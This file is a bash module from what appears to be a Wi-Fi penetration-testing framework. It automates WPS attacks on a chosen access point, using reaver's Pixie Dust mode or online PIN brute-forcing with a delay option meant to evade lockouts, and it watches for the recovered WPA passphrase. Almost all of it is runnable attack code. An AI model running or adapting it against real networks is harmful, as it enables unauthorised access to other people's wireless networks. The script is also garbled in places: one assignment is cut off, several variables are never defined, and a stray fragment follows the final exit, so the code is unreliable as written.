#!/usr/bin/env bash
# MODULE_META
# NAME="WPS Vulnerability Testing"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="wash,reaver,bully"
# DESC="Detect WPS-enabled APs and test for PIN/PBC vulnerabilities"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="no"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d3_wps_testing.sh
#  D3: WPS Vulnerability Testing (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Scan for WPS-enabled APs using 'wash'.
#  2. Interactive selection: Pixie Dust (Fast) vs Online Brute-Force (Loud).
#  3. Optional: Configure delay/rate-limiting to bypass lockouts.
#  4. Smart Exit upon successful recovery.
#===============================================================================

set -euo pipefail

C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_ACTION="${ASTRA_COLOR_ACTION:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"


# Inputs from Environment

WPS_ATTACK="${WPS_ATTACK:-1}"
WPS_DELAY="${WPS_DELAY:-}"# ...

if [[ -z "$INTERFACE" ]]; then
    echo "[!] MONITOR_INTERFACE not set."
    exit 1
fi

# 1. Scan Phase
echo -e "${C_PROMPT}[*]${C_RESET} Scanning for WPS-enabled networks..."
WASH_FILE="${EVIDENCE_DIR}/${TC_ID}_wash_results.txt"
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    timeout 30 wash -i "$INTERFACE" 2>&1 | tee "$WASH_FILE" || true
else
    timeout 30 wash -i "$INTERFACE" > "$WASH_FILE" 2>&1 || true
fi

# 2. Tactical Selection
if [[ -n "$BSSID" ]]; then
    echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Select WPS Attack Vector for ${C_VAR}${BSSID}${C_RESET}:"
    echo "    1) Pixie Dust (Fast, 1 transaction)"
    echo "    2) Online Brute-Force (Sequential guessing)"
attack_choice="${WPS_ATTACK:-1}"

    REAVER_ARGS="-i $INTERFACE -b $BSSID"
    [[ -n "$CHANNEL" ]] && REAVER_ARGS+=" -c $CHANNEL"

    if [[ "$attack_choice" == "1" ]]; then
        echo -e "${C_PROMPT}[*]${C_RESET} Initializing Pixie Dust attack..."
        REAVER_ARGS+=" -K 1"
    else
delay="${WPS_DELAY:-}"
        [[ -n "$delay" ]] && REAVER_ARGS+=" -d $delay"
        echo -e "${C_PROMPT}[!]${C_RESET} ${C_BOLD}WARNING: Online brute-force is loud and will trigger WIDS.${C_RESET}"
    fi

    echo "[*] Starting reaver with tactical parameters..."
    INFO_FILE="${EVIDENCE_DIR}/${TC_ID}_reaver_info.txt"
    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
        reaver $REAVER_ARGS -vv 2>&1 | tee "$INFO_FILE" &
    else
        reaver $REAVER_ARGS -vv > "$INFO_FILE" 2>&1 &
    fi
    REAVER_PID=$!
    
    # 3. Smart Exit Polling
    ELAPSED=0
    SUCCESS=0
    while [[ $ELAPSED -lt $SCAN_TIME ]]; do
        PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
        STATUS="Testing WPS... ($(( SCAN_TIME - ELAPSED ))s left)"
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"

        if grep -qiE "WPA PSK|WPS PIN" "$INFO_FILE"; then
            echo "[!] SUCCESS: WPS DATA RECOVERED!"
            SUCCESS=1
            break
        fi
        if ! kill -0 "$REAVER_PID" 2>/dev/null; then
            echo "[*] Reaver process terminated."
            break
        fi
        sleep 5
        ((ELAPSED+=5))
    done
    
    kill "$REAVER_PID" 2>/dev/null || true
    wait "$REAVER_PID" 2>/dev/null || true
    
    if [[ $SUCCESS -eq 1 ]]; then
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "WPS Attack Successful" \
            --severity CRITICAL \
            --desc "Successfully recovered credentials for BSSID ${BSSID} via reaver." \
            --evidence "$INFO_FILE" \
            --rationale "Successful WPS exploitation bypasses the need for complex handshake cracking."
    else
        echo "[+] WPS audit complete. No data recovered in this window."
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[$TC_ID] Audit Complete" \
            --severity INFO \
            --desc "Attempted WPS exploitation on ${BSSID}. No results obtained." \
            --evidence "$INFO_FILE" \
            --rationale "Attack failure suggests AP hardening or rate-limiting."
    fi
else
    # General report
    WPS_COUNT=$(awk 'NR>2 {count++} END {print count+0}' "$WASH_FILE")
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WPS Audit Complete" \
        --severity INFO \
        --desc "Identified ${WPS_COUNT} networks with WPS enabled." \
        --evidence "$WASH_FILE" \
        --rationale "WPS status identifies high-risk targets for further assessment."
fi

exit 0
it 0
